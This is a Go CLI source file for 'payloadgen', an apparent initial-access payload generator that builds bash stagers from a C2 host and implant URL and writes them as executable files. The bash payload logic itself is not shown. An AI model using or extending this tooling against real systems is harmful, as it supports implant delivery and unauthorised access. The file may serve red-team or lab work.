package cli

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/bishopfox/sliver/scenario/weaponizer/internal/config"
	"github.com/bishopfox/sliver/scenario/weaponizer/internal/payload/bash"
	"github.com/spf13/cobra"
)

func Execute() {
	var (
		configPath string

		// CLI flags
		c2Host     string
		implantURL string
		output     string
	)

	rootCmd := &cobra.Command{
		Use:     "payloadgen",
		Short:   "Initial access payload generator",
		Version: "1.1.0",
	}

	// =========================
	// GENERATE COMMAND
	// =========================
	generateCmd := &cobra.Command{
		Use:   "generate",
		Short: "Generate payloads (CLI or YAML)",
		Run: func(cmd *cobra.Command, args []string) {

			// =========================
			// MODE 1: YAML CONFIG
			// =========================
			if configPath != "" {
				cfg, err := config.LoadConfig(configPath)
				if err != nil {
					fmt.Printf("Failed to load config: %v\n", err)
					os.Exit(1)
				}

				for _, p := range cfg.Payloads {

					infra, ok := cfg.Infra[p.InfraRef]
					if !ok {
						fmt.Printf("Infra not found: %s\n", p.InfraRef)
						continue
					}

					var payload string

					switch p.Type {
					case "bash":
						payload = bash.Generate(infra.ImplantURL, infra.C2Host)

					default:
						fmt.Printf("Unsupported payload type: %s\n", p.Type)
						continue
					}

					outPath := filepath.Join(cfg.OutputDir, p.Filename)

					if err := os.WriteFile(outPath, []byte(payload), 0755); err != nil {
						fmt.Printf("Write failed: %v\n", err)
						continue
					}

					fmt.Printf("%s -> %s\n", p.Name, outPath)
				}

				return
			}

			// =========================
			// MODE 2: CLI FLAGS
			// =========================

			// fallback to env
			if c2Host == "" {
				c2Host = os.Getenv("C2_HOST")
			}
			if implantURL == "" {
				implantURL = os.Getenv("IMPLANT_URL")
			}

			if c2Host == "" || implantURL == "" {
				fmt.Println("Missing required values")
				fmt.Println("Use flags OR env OR config.yaml")
				os.Exit(1)
			}

			payload := bash.Generate(implantURL, c2Host)

			if output != "" {
				if err := os.WriteFile(output, []byte(payload), 0755); err != nil {
					fmt.Printf(" Write failed: %v\n", err)
					os.Exit(1)
				}
				fmt.Printf("Payload written to %s\n", output)
			} else {
				fmt.Println(payload)
			}
		},
	}

	// =========================
	// FLAGS
	// =========================

	generateCmd.Flags().StringVarP(&configPath, "config", "c", "", "Path to config.yaml")

	generateCmd.Flags().StringVar(&c2Host, "c2-host", "", "C2 server host")
	generateCmd.Flags().StringVar(&implantURL, "implant-url", "", "Implant base URL")
	generateCmd.Flags().StringVarP(&output, "output", "o", "", "Output file")

	rootCmd.AddCommand(generateCmd)

	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
